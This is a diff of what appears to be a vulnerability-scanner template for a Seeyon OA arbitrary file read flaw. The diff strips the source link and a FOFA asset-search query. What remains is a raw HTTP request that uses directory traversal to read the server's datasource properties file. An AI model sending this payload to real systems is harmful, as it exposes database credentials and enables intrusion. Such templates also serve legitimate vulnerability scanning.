@@ -3,12 +3,8 @@ info:
   name: 致远OA correct任意文件读取（后台）漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xgs4f4p5go7g6fmq'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xgs4f4p5go7g6fmq
-    fofa: app="致远互联-OA"
 http:
 - raw:
   - 'GET /seeyon/aiedoc/correct.do?method=downloadErrorReport&fileName=../../../conf/datasourceCtp.properties HTTP/1.1
